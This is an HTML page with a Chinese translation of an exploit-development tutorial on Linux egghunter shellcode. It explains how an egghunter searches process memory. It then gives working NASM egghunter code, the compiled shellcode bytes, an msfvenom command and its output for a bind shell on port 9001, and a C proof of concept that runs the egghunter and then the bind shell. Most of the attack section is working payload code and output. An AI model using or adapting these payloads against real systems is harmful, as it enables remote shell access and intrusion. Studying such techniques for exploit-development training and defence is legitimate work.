<html>
<head>
<title>[ExpDev] Egghunter (Linux Implementation)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Egghunter (Linux实现)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-egghunter-linux-implementation-49154ff4d225?source=collection_archive---------1-----------------------#2020-12-28">https://infosecwriteups.com/expdev-egghunter-linux-implementation-49154ff4d225?source=collection_archive---------1-----------------------#2020-12-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><h1 id="3433" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">egg hunter是什么？</strong></h1><p id="ab4f" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">就我个人而言，当我在学习<a class="ae lm" href="https://www.offensive-security.com/offsec/retiring-ctp-intro-new-courses/" rel="noopener ugc nofollow" target="_blank"> OSCE课程</a>形式攻击安全时，我曾与Egghunter打过交道。Egghunter本质上是一个分阶段的有效负载，由相对较短的外壳代码(大约30+字节)组成。在第一个缓冲区空间有限的情况下，我们可以在那里实现Egghunter外壳代码，这将在进程内存中搜索更大的缓冲区空间，在那里我们放置带有最终反向/绑定外壳代码的签名(也称为“Egg”)。</p><p id="5e30" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">下图是Egghunter工作方式的简化版:</p><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div role="button" tabindex="0" class="ly lz di ma bf mb"><div class="gh gi ls"><img src="../Images/492c472414979a374628e25d0bb4c6ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hUsvtezBVXbsCwqzFXKb6g.png"/></div></div></figure><h1 id="2446" class="jq jr it bd js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn bi translated"><strong class="ak">深度猎蛋者</strong></h1><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div class="gh gi me"><img src="../Images/5ab8d5d977b2f6b044bcbd7e4ac3e5ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*MyzvZj3h2nCCSg7gi9Puzw.png"/></div></figure><p id="90ea" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">尽管我知道Egghunter是什么以及如何使用它，但我想更详细地了解它。所以我读了Matt Miller的<a class="ae lm" href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" rel="noopener ugc nofollow" target="_blank">安全搜索进程虚拟地址空间</a>来了解更多关于Egghunter的知识。</p><p id="cf40" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">以下是这篇文章的要点:</p><ul class=""><li id="a9e2" class="mf mg it kq b kr ln kv lo kz mh ld mi lh mj ll mk ml mm mn bi translated">按照作者的说法，推荐使用8字节egg，因为它可以提供足够的唯一性，可以很容易地选择它，而不会有任何高的冲突风险。</li></ul><h2 id="d910" class="mo jr it bd js mp mq dn jw mr ms dp ka kz mt mu ke ld mv mw ki lh mx my km mz bi translated"><strong class="ak"> Linux Egghunter实现</strong></h2><ul class=""><li id="58f5" class="mf mg it kq b kr ks kv kw kz na ld nb lh nc ll mk ml mm mn bi translated">在Linux实现中，有两种主要方法:</li></ul><p id="0cdf" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">1) SIGSEGV处理程序，用于捕获无效的内存地址解引用，并防止程序崩溃</p><p id="c3b6" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">2)使用OS系统调用接口来验证内核模式中的进程VMAs。</p><ul class=""><li id="adfd" class="mf mg it kq b kr ln kv lo kz mh ld mi lh mj ll mk ml mm mn bi translated">在Linux实现中，SIGSEGV处理程序技术有一个很大的缺点，就是大小问题。</li><li id="f6ac" class="mf mg it kq b kr nd kv ne kz nf ld ng lh nh ll mk ml mm mn bi translated">在Linux实现中，当遇到无效的内存空间时，系统调用将返回<code class="fe ni nj nk nl b">EFAULT</code>错误代码，这正是Egghunter需要的信息类型，因为它可以遍历进程的虚拟地址空间(VAS ),而不会使程序崩溃。</li></ul><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div role="button" tabindex="0" class="ly lz di ma bf mb"><div class="gh gi nm"><img src="../Images/bc15597b5c91906f9ea192fe0b868e35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z8vcvEdzCGMGaY5TglnKOg.png"/></div></div></figure><h2 id="4119" class="mo jr it bd js mp mq dn jw mr ms dp ka kz mt mu ke ld mv mw ki lh mx my km mz bi translated"><strong class="ak"> Windows Egghunter实现</strong></h2><ul class=""><li id="047d" class="mf mg it kq b kr ks kv kw kz na ld nb lh nc ll mk ml mm mn bi translated">在Windows实现中，也有两种主要方法:</li></ul><p id="7d5c" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">1) SEH(结构异常处理程序)</p><p id="1a05" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">2)操作系统调用(IsBadReadPtr &amp; NtDisplayString)</p><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div role="button" tabindex="0" class="ly lz di ma bf mb"><div class="gh gi nn"><img src="../Images/72df2e666e3fbd58803ba6c2b995a566.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*33UwwvnUlckti3cVpp8xlA.png"/></div></div></figure><h2 id="fcd0" class="mo jr it bd js mp mq dn jw mr ms dp ka kz mt mu ke ld mv mw ki lh mx my km mz bi translated"><strong class="ak"> Egghunter外壳代码</strong></h2><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div class="gh gi no"><img src="../Images/a0efd5b938b56f5567ba7b3789f5a69c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/0*f2jP6haHnH7i_DYJ.jpg"/></div></figure><p id="9c73" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">出于演示的目的，我将使用Linux实现的<code class="fe ni nj nk nl b">access()</code> syscall版本来构建Egghunter有效负载。让我们创建下面的<code class="fe ni nj nk nl b">egghunter.nasm</code>文件:</p><pre class="lt lu lv lw gt np nl nq nr aw ns bi"><span id="35a7" class="mo jr it nl b gy nt nu l nv nw">global _start</span><span id="266a" class="mo jr it nl b gy nx nu l nv nw">section .text</span><span id="aa98" class="mo jr it nl b gy nx nu l nv nw">_start:<br/>        mov ebx, 0x50905090     <strong class="nl iu">; 4 byte Egg (*Little-Endian)</strong><br/>        xor ecx, ecx            <strong class="nl iu">; Zero out ECX</strong><br/>        mul ecx                 <strong class="nl iu">; Zero out EAX and EDX</strong></span><span id="c9a0" class="mo jr it nl b gy nx nu l nv nw">next_page:<br/>        or dx, 0xfff            <strong class="nl iu">; Set PAGE_SIZE 4095 (0x1000)</strong></span><span id="8be6" class="mo jr it nl b gy nx nu l nv nw">next_addr:<br/>        inc edx                 <strong class="nl iu">; Increment by 4095 (0x1000)</strong><br/>        pushad                  <strong class="nl iu">; Preserve all general purposes <br/>                                  register values onto the stack</strong><br/>        lea ebx, [edx+4]        <strong class="nl iu">; Checking if the address is</strong> <br/>                                  <strong class="nl iu">readable</strong><br/>        mov al, 0x21            <strong class="nl iu">; Set AL to syscall access() (0x21)</strong><br/>        int 0x80                <strong class="nl iu">; Soft-interrupt to execute the <br/>                                  syscall</strong></span><span id="293a" class="mo jr it nl b gy nx nu l nv nw">        cmp al, 0xf2            <strong class="nl iu">; Check for EFAULT (Invalid memory <br/>                                  space)</strong><br/>        popad                   <strong class="nl iu">; Restore the preserved registers</strong><br/>        jz next_page            <strong class="nl iu">; EFAULT --&gt; Invalid memory space <br/>                                  --&gt; Next page</strong></span><span id="94d4" class="mo jr it nl b gy nx nu l nv nw">        cmp [edx], ebx          <strong class="nl iu">; Check for the address if it <br/>                                  contains egg</strong><br/>        jnz next_addr           <strong class="nl iu">; If not, go back to look for our <br/>                                  first egg</strong></span><span id="5164" class="mo jr it nl b gy nx nu l nv nw">        cmp [edx+4], ebx        <strong class="nl iu">; Check for the address + 4</strong> <br/>        jnz next_addr           <strong class="nl iu">; If not, go back to look for our <br/>                                  second egg</strong></span><span id="08ca" class="mo jr it nl b gy nx nu l nv nw">        jmp edx                 <strong class="nl iu">; Both eggs are found --&gt; JMP to <br/>                                  EDX --&gt; Continue execution flow</strong></span></pre><h2 id="52fc" class="mo jr it bd js mp mq dn jw mr ms dp ka kz mt mu ke ld mv mw ki lh mx my km mz bi translated"><strong class="ak">编译+绑定外壳代码(msfvenom) </strong></h2><p id="802f" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">我创建了一个简单的编译器<a class="ae lm" href="https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py" rel="noopener ugc nofollow" target="_blank"> compilerX86.py </a>。</p><pre class="lt lu lv lw gt np nl nq nr aw ns bi"><span id="2610" class="mo jr it nl b gy nt nu l nv nw"># python compilerX86.py -f egghunter</span><span id="1baf" class="mo jr it nl b gy nx nu l nv nw">[+] Assemble: egghunter.nasm<br/>[+] Linking: egghunter.o<br/><strong class="nl iu">[+] Shellcode: “\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2”</strong><br/>[+] Creating File: shellcode.c<br/>[+] Compiling Executable: shellcode<br/>[+] Enjoy!</span></pre><p id="d2e3" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">此外，使用msfvenom，让我们创建一个绑定外壳:</p><pre class="lt lu lv lw gt np nl nq nr aw ns bi"><span id="bd2f" class="mo jr it nl b gy nt nu l nv nw"># msfvenom -p linux/x86/shell_bind_tcp LPORT=9001 -f c</span><span id="283c" class="mo jr it nl b gy nx nu l nv nw">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br/>[-] No arch selected, selecting arch: x86 from the payload<br/>No encoder specified, outputting raw payload<br/>Payload size: 78 bytes<br/>Final size of c file: 354 bytes<br/><strong class="nl iu">unsigned char buf[] =<br/>“\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80”<br/>“\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a”<br/>“\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0”<br/>“\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f”<br/>“\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0”<br/>“\x0b\xcd\x80”;</strong></span></pre><h2 id="2237" class="mo jr it bd js mp mq dn jw mr ms dp ka kz mt mu ke ld mv mw ki lh mx my km mz bi translated"><strong class="ak">最后一击</strong></h2><p id="48c5" class="pw-post-body-paragraph ko kp it kq b kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll im bi translated">最后，让我们结合这些bind shellcode和egghunter来创建以下漏洞脚本<code class="fe ni nj nk nl b">egghunter.c</code>:</p><pre class="lt lu lv lw gt np nl nq nr aw ns bi"><span id="0ea2" class="mo jr it nl b gy nt nu l nv nw">#include &lt;stdio.h&gt;</span><span id="7d98" class="mo jr it nl b gy nx nu l nv nw">unsigned char egghunter[] = \<br/>"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42"<br/>"\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a"<br/>"\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";</span><span id="7418" class="mo jr it nl b gy nx nu l nv nw">unsigned char shellcode[] = \<br/>"\x90\x50\x90\x50\x90\x50\x90\x50"  // Egg<br/>"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"<br/>"\x5b\x5e\x52\x68\x02\x00\x23\x29\x6a\x10\x51\x50\x89\xe1\x6a"<br/>"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"<br/>"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"<br/>"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"<br/>"\x0b\xcd\x80";</span><span id="8bd3" class="mo jr it nl b gy nx nu l nv nw">void main() {<br/>    int (*ret)() = (int(*)())egghunter;<br/>    ret();</span><span id="d719" class="mo jr it nl b gy nx nu l nv nw">    return 0;<br/>}</span></pre><p id="b2c2" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">通过用<code class="fe ni nj nk nl b">gcc</code>编译上述脚本，我们可以成功创建一个概念验证Egghunter程序。它首先执行Egghunter，一旦找到鸡蛋，它接下来执行bind shell:</p><figure class="lt lu lv lw gt lx gh gi paragraph-image"><div role="button" tabindex="0" class="ly lz di ma bf mb"><div class="gh gi ny"><img src="../Images/6bfdc033c06340c6a4e2c329945bd568.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T8Rkt4z5kwKUdhheWXnM8g.png"/></div></div></figure><p id="4803" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">我写了下面的博客，我用Egghunter创建了现实生活中的漏洞:</p><ul class=""><li id="63fe" class="mf mg it kq b kr ln kv lo kz mh ld mi lh mj ll mk ml mm mn bi translated"><a class="ae lm" href="https://bigb0ss.medium.com/expdev-winamp-5-12-exploitation-using-egghunter-b12383f7a449" rel="noopener">https://bigb0ss . medium . com/expdev-winamp-5-12-exploitation-using-egg hunter-b 12383 f7a 449</a></li><li id="d200" class="mf mg it kq b kr nd kv ne kz nf ld ng lh nh ll mk ml mm mn bi translated"><a class="ae lm" href="https://medium.com/bugbountywriteup/expdev-vulnserver-part-3-24859bd31c0a" rel="noopener">https://medium . com/bugbountywriteup/exp dev-vulnserver-part-3-24859 BD 31 c0a</a></li><li id="5b10" class="mf mg it kq b kr nd kv ne kz nf ld ng lh nh ll mk ml mm mn bi translated"><a class="ae lm" href="https://bigb0ss.medium.com/expdev-hp-openview-nnm-7-5-exploitation-seh-egghunter-b25ea5fab43f?source=search_popover-------------------------------------" rel="noopener">https://bigb0ss . medium . com/exp dev-HP-openview-nnm-7-5-exploitation-seh-egg hunter-b 25 ea 5 fab 43 f？source=search_popover - </a></li></ul><p id="001c" class="pw-post-body-paragraph ko kp it kq b kr ln kt ku kv lo kx ky kz lp lb lc ld lq lf lg lh lr lj lk ll im bi translated">感谢阅读！</p></div></div>    
</body>
</html>